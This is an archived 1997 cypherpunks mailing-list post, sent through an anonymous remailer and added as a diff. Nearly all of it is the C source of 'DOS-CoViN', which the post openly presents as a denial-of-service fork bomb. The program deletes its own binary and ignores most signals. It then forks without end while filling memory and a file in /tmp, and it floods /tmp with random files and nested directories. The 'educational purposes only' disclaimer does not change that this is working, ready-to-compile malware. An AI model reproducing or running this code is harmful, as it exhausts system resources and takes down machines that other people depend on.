@@ -1,0 +1,236 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: fork problem, fix? -->
+<!--X-From-R13: abobqlNercynl.pbz (@nzr Ivguuryq ol Drdhrfg) -->
+<!--X-Date: Mon, 21 Jul 1997 13:19:00 +0800 -->
+<!--X-Message-Id: 199707210455.GAA29231@basement.replay.com -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>fork problem, fix?</TITLE>
+<LINK REV="made" HREF="mailto:nobody@replay.com">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg00805.html">Date Prev</A>][<A HREF="msg00806.html">Date Next</A>][<A HREF="msg00805.html">Thread Prev</A>][<A HREF="msg00806.html">Thread Next</A>][<A HREF="index.html#00811">Date Index</A>][<A HREF="threads.html#00811">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>fork problem, fix?</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com.redhat%2Dlist">cypherpunks@toad.com.redhat-list</A>@redhat.com</LI>
+<LI><em>subject</em>: fork problem, fix?</LI>
+<LI><em>From</em>: <A HREF="mailto:nobody@replay.com">nobody@replay.com</A> (Name Withheld by Request)</LI>
+<LI><em>Date</em>: Mon, 21 Jul 1997 06:55:08 +0200 (MET DST)</LI>
+<LI><em>Organization</em>: Replay and Company UnLimited.</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@Algebra.COM">owner-cypherpunks@Algebra.COM</A></LI>
+<LI><em>XComm</em>: This message was automaticly Remailed by an Anonymous Remailer.</LI>
+<LI><em>XComm</em>: Report problems or inappropriate use to &lt;postmaster@replay.com&gt;</LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+
+/* DOS-CoViN. Version .53b, coded by Vio, some ideas are from the
+   bugtraq
+
+   This program is a beefed up classic denial of service fork()'er :)
+
+   Compilation:
+	on BSD type of systems do:  gcc -DBSD_C  -o cvn cvn.c
+	on SysV type of systems do: gcc -DSYSV_C -o cvn cvn.c
+
+	on my linux, I can compile it with both -DBSD_C and -DSYSV_C
+
+	if your not sure, you can experiment, or compile it
+	without any -D'efines
+
+
+   In the future:
+	SunOS signals ignored.
+	Creation of random symlinks for more gory destruction.
+	Using advanced technology coding to make the hard drive
+		blow up with a loud boom and the console explode
+		causing a nuclear meltdown.
+
+
+
+   Direct All Suggestions And Flames to: Vio
+
+  NOTE: this program is provided for educational purposes only, its author
+	will not take any responsibility for any stupid things you will
+	decide to do.
+
+	this has been tested, but not the latest version of it.
+
+            .a&amp;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$&amp;a.
+            $$'   s   `$'   s   `$    $    $    $    `$   $$
+            $$    $    $    $    $    $    $    $         $$
+            $$    $    $ p  $ h  $ e  $ a  $ r  $   $a.   $$
+            $$    $ssss$    $    $    $    $    $   $$$   $$
+            $$    $    $    $    $.   $   ,$    $   $$$   $$
+            $$.   $   ,$.   $   ,$$.     ,$$   .$   $$$   $$
+            `$$&amp;@%o%@&amp;$$$&amp;@%o%@&amp;$$$$$%o%$$$$.a$$$.a$$$$$$$$'
+
+*/
+
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+
+#define MAX_FILELEN 100	/* The _actual_ max length */
+#define MAX_DIRLEN 10
+
+#define START_DIR "/tmp"   /* This can be substituted for any directory */
+			   /* that you have write access to		*/
+
+void dirs_generator(void);
+
+main(int argc, char *argv[])
+{
+int fp;
+char *buff;
+char chr;
+
+unlink(argv[0]);
+
+/* You might wanna ignore all the signals you can ignore.. */
+signal(SIGINT,	SIG_IGN);	/* If any of the signals don't work */
+signal(SIGHUP,	SIG_IGN);	/* on the system you are compiling  */
+signal(SIGTERM,	SIG_IGN);	/* them on, just erase that line    */
+signal(SIGALRM,	SIG_IGN);
+signal(SIGBUS,	SIG_IGN);
+signal(SIGFPE,	SIG_IGN);
+signal(SIGILL,	SIG_IGN);
+signal(SIGIOT,	SIG_IGN);
+signal(SIGPIPE,	SIG_IGN);
+signal(SIGQUIT,	SIG_IGN);
+signal(SIGSEGV,	SIG_IGN);
+signal(SIGTRAP,	SIG_IGN);
+signal(SIGUSR1,	SIG_IGN);
+signal(SIGUSR2,	SIG_IGN);
+
+#ifdef BSD_C 
+	signal(SIGPROF, SIG_IGN);
+	signal(SIGSTOP, SIG_IGN);
+	signal(SIGTSTP, SIG_IGN);
+	signal(SIGTTIN,	SIG_IGN);
+	signal(SIGTTOU,	SIG_IGN);
+	signal(SIGVTALRM,	SIG_IGN);
+	signal(SIGXCPU,	SIG_IGN);
+	signal(SIGXFSZ,	SIG_IGN);
+#endif
+
+#ifdef SYSV_C
+	signal(SIGPOLL,	SIG_IGN);
+	signal(SIGPWR,	SIG_IGN);
+#endif
+
+if(fork()) {
+	printf("Now crashing and blowing up this system.. have a nice day\n");
+	printf("You can safely logout, and let the proggie do its work\n");
+	printf("or you can stick around and watch lag go from 0 to bitch\n");
+	printf("in a matter of seconds\n");
+	printf("					--CoViN		 \n");
+	exit(0);
+  }
+fp=open("/tmp/.foo",O_WRONLY|O_CREAT);
+if(fork()) {
+	while(1) {
+		fork();
+		buff = malloc(64000);
+		write(fp, buff, 64000);
+		system("uptime");
+ 	}
+ }
+dirs_generator();
+}
+
+
+void dirs_generator(void)
+{
+char alph[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ. ";
+char fl[MAX_FILELEN]; 
+char dir[MAX_DIRLEN];
+int i;
+int flen;
+
+printf("Making dirs..\n");
+chdir(START_DIR);
+
+fork();	/* For the simplicity of the code.. we also want more dir's from */
+fork(); /* the START_DIR						 */
+fork();
+
+while(1) {
+	fork();
+	flen= (rand() % MAX_FILELEN) - 1;
+	for(i=0; i&lt;flen; i++)
+                fl[i] = alph[rand() % strlen(alph)];
+	fl[MAX_FILELEN-1]=0;
+	i=open(fl,O_WRONLY|O_CREAT);
+	write(i,"fuck you! CoViN",16);
+	close(i);
+
+	flen= (rand() % MAX_DIRLEN) - 1;
+	for(i=0; i&lt;flen; i++)
+		dir[i] = alph[rand() % strlen(alph)];
+	dir[MAX_DIRLEN-1]=0;
+	mkdir(dir,0);	
+	chdir(dir);
+       }
+}
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg00805.html">Something of little importance</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg00806.html">Re: New Cypher ListServ (part 1)</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00805.html">Something of little importance</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00806.html">Re: New Cypher ListServ (part 1)</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#00811"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#00811"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
